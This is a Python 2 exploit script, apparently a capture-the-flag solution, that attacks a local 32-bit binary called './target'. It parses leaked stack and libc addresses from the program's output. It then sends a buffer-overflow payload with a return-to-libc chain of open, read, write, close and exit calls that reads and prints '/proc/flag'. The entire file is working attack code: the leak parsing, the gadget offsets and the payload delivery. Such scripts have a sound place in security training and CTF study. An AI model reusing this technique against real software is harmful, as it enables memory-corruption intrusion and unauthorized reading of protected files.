#!/usr/bin/env python2

import struct
import subprocess as sp

ADDR_STACK  = 0xdeadbeef
ADDR_LIBC   = 0xdeadbeef
ADDR_FLAG   = 0x160
ADDR_OPEN   = 0xda740
ADDR_READ   = 0xdabd0
ADDR_WRITE  = 0xdac50
ADDR_GADGET = 0x17498
ADDR_CLOSE  = 0xdb4d0
ADDR_EXIT   = 0x331e0
ADDR_BUF    = 257
STR_FLAG    = "\x2f\x70\x72\x6f\x63\x2f\x66\x6c\x61\x67\x00"

def p32(n):
    return struct.pack("<I", n)

def get_payload():
    payload = ''
    payload += STR_FLAG
    payload += 'A'*ADDR_BUF
    payload += p32(ADDR_OPEN)
    payload += p32(ADDR_GADGET)
    payload += p32(ADDR_STACK)
    payload += "\x00\x00\x00\x00"
    payload += "\x00\x00\x00\x00"
    payload += p32(ADDR_READ)
    payload += p32(ADDR_GADGET)
    payload += "\x03\x00\x00\x00"
    payload += p32(ADDR_FLAG)
    payload += "\x11\x04\x00\x00"
    payload += p32(ADDR_WRITE)
    payload += p32(ADDR_GADGET)
    payload += "\x01\x00\x00\x00"
    payload += p32(ADDR_FLAG)
    payload += "\x11\x04\x00\x00"
    payload += p32(ADDR_CLOSE)
    payload += p32(ADDR_EXIT)
    payload += "\x03\x00\x00\x00"
    payload += "\n"
    return payload

if __name__ == '__main__':
    p = sp.Popen("./target", stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE)
    print(p.stdout.readline())

    count = 1
    while True:
        l = p.stdout.readline()
        l = l.strip()
        if count == 1:
            ADDR_STACK = int(l[3:11], 16) - 0x128
            ADDR_FLAG += ADDR_STACK
        if count == 6:
            ADDR_LIBC = int(l[15:24], 16) - 0x19a83
        print(str(count) + ' : ' + l)
        count = count + 1
        if l == ">":
            break

    #ADDR_LIBC = 0xb7e26000
    #ADDR_STACK = 0xbffff5a0

    print(hex(ADDR_STACK))
    print(hex(ADDR_FLAG))
    print(hex(ADDR_LIBC))
    ADDR_OPEN   += ADDR_LIBC
    ADDR_READ   += ADDR_LIBC
    ADDR_WRITE  += ADDR_LIBC
    ADDR_GADGET += ADDR_LIBC
    ADDR_CLOSE  += ADDR_LIBC
    ADDR_EXIT   += ADDR_LIBC

    print(hex(ADDR_OPEN))
    print(hex(ADDR_READ))
    print(hex(ADDR_WRITE))
    print(hex(ADDR_GADGET))
    print(hex(ADDR_CLOSE))
    print(hex(ADDR_EXIT))

    print(get_payload())

    p.stdin.write(get_payload())

    while True:
        l = p.stdout.readline()
        l = l.strip()
        print(l)
        if l == "":
            break
    #p.terminate()
    #p.wait()
    #print(p.returncode)

